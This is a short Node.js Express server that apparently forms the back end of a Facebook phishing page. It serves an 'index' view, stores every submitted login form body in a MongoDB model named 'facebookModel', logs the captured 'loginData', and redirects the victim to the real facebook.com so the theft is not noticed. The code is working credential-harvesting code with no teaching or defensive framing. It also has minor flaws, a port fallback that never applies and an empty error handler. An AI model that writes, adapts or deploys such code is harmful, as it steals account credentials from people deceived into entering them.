const express = require("express");
const app = express();
const bodyParser = require("body-parser");
const mongoose = require("mongoose");
const path = require("path")

const hbs = require("hbs")
require("./mongo")

const facebookModel = require("./scema");
// console.log(mongoCon())
const port = 3000 || process.env.PORT;

// add static path
app.use(express.static(path.join(__dirname, "./public")))
app.use(express.json());
app.use(express.urlencoded({ extended: false }))
// set engine
app.set("view engine", "hbs")

app.get("/", (req, res) => {
    res.status(200).render("index")
})
app.post("/", async (req, res) => {
    try {
        let savedata = new facebookModel(req.body);
        let loginData = await savedata.save();
        console.log(loginData)
        res.redirect("https://www.facebook.com/")
    } catch (error) {

    }
})

app.listen(port, () => {
    console.log("app is runnign");
})